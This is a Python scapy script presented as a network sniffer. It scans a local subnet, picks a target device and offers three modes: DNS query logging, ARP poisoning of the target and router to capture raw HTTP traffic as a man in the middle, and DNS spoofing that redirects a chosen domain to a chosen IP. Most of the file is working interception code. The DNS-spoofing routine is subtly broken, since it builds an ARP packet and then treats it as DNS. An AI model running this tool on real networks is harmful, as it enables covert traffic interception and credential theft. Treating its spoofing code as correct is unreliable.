#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import sniff, send, DNS, DNSRR, ARP, Ether, srp, Raw
from mac_vendor_lookup import MacLookup, VendorNotFoundError

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (eg "192.168.0.0/24")',
                    required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    """
    Performs ARP ping across the local subnet. Once a device responds, its IP
    and MAC address will be recorded. MAC address lookup will also be performed
    against the pre-defined OUI in https://standards-oui.ieee.org/oui/oui.txt.
    """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface)
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'\n{Fore.RED}Exit option: Type "exit" to quit{Style.RESET_ALL}\n')
    return input('Pick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def dns_sniff(self):
        sniff(iface=self.iface, prn=self.dns_handler,
              filter=f'src host {self.targetip} and udp port 53')

    def dns_handler(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{Fore.GREEN}{time} | {Fore.BLUE}{self.targetip} -> {Fore.RED}{record}{Style.RESET_ALL}]')

    def arp_sniff(self):
        print(f'{Fore.YELLOW}Starting ARP poisoning and HTTP packet capture...{Style.RESET_ALL}')
        threading.Thread(target=self.arp_poison).start()
        sniff(iface=self.iface, prn=self.http_handler, filter=f'tcp port 80')

    def arp_poison(self):
        """
        Sends continuous ARP packets to the target and router to perform a MITM attack.
        This allows capturing HTTP packets between the target and the router.
        """
        victim_arp = ARP(op=2, pdst=self.targetip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.routerip)
        router_arp = ARP(op=2, pdst=self.routerip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.targetip)
        while True:
            send(victim_arp, verbose=False)
            send(router_arp, verbose=False)

    def http_handler(self, pkt):
        """
        Handles all captured HTTP packets and prints the raw payload.
        """
        if pkt.haslayer(Raw):
            print(f'{Fore.GREEN}[HTTP Packet]{Style.RESET_ALL} {pkt[Raw].load.decode(errors="ignore")}')

    def dns_poison(self):
        target_domain = input(f'{Fore.YELLOW}Enter the domain to spoof: {Style.RESET_ALL}')
        redirect_ip = input(f'{Fore.YELLOW}Enter the IP to redirect the domain: {Style.RESET_ALL}')
        
        def poison(pkt):
            if pkt.haslayer(DNS) and pkt[DNS].qd.qname.decode('utf-8').strip('.') == target_domain:
                spoofed_pkt = Ether(dst=pkt[Ether].src) / ARP()
                spoofed_pkt[DNS].an = DNSRR(rrname=target_domain, rdata=redirect_ip)
                send(spoofed_pkt)
                print(f'{Fore.GREEN}Spoofed DNS Response Sent{Style.RESET_ALL}: {target_domain} -> {redirect_ip}')
        
        sniff(iface=self.iface, prn=poison, filter=f'src host {self.targetip} and udp port 53')

    def sniff_menu(self):
        while True:
            print(f'\n{Fore.RED}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. DNS Sniff')
            print(f'2. HTTP Sniff (ARP Poison + HTTP Capture)')
            print(f'3. DNS Poison')
            print(f'4. Exit')
            choice = input(f'{Fore.GREEN}Enter your choice: {Style.RESET_ALL}')
            
            if choice == '1':
                self.dns_sniff()
            elif choice == '2':
                self.arp_sniff()
            elif choice == '3':
                self.dns_poison()
            elif choice == '4':
                print(f'{Fore.RED}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}')

if __name__ == '__main__':
    while True:
        targetip = arp_scan(opts.network, opts.iface)
        if targetip.lower() == 'exit':
            print(f'{Fore.RED}Goodbye!{Style.RESET_ALL}')
            break
        device = Device(opts.routerip, targetip, opts.iface)
        device.sniff_menu()
